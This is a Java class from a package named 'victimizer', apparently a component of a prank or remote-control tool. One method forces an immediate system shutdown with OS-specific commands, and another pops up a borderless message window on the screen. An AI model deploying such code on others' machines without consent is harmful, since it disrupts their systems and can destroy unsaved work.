package com.crashcourse.victimizer;

import java.awt.Color;
import java.awt.FlowLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;

public class Actions {
	public Actions(Victimizer instance) {
	}
	
	public static void shutdown() {
		String shutdownCommand;
	    String operatingSystem = System.getProperty("os.name");
	    System.out.println("Operating Sys: " + operatingSystem);

	    if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem)) {
	        shutdownCommand = "sudo shutdown -h now";
	    }
	    else if ("Windows".equals(operatingSystem) || "Windows 10".equals(operatingSystem)) {
	        shutdownCommand = "shutdown.exe -s -t 0";
	    }
	    else {
	        throw new RuntimeException("Unsupported operating system.");
	    }

	    try {
			Runtime.getRuntime().exec(shutdownCommand);
		} catch (IOException e) {e.printStackTrace();}
	    System.exit(0);
	}
	
	public static void displayMessage(String message, int displayTime) {
		JFrame frame = new JFrame("Message from CrashCourse");
		frame.setUndecorated(true);
		frame.setBackground(new Color(255, 255, 255, 50));
		 
        JPanel panel = new JPanel();
        panel.setLayout(new FlowLayout());
 
        JLabel label = new JLabel();
        label.setText(message);
        
        JButton close = new JButton();
        close.setText("X");
        close.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				frame.dispose();
			}
        });
        
        panel.setBackground(new Color(255, 255, 255, 50));
        panel.add(label);
        panel.add(close);
 
        frame.add(panel);
        frame.pack();
        frame.setMinimumSize(frame.getSize());
        frame.setLocation(2,15);
        frame.setVisible(true);
        
	}

}
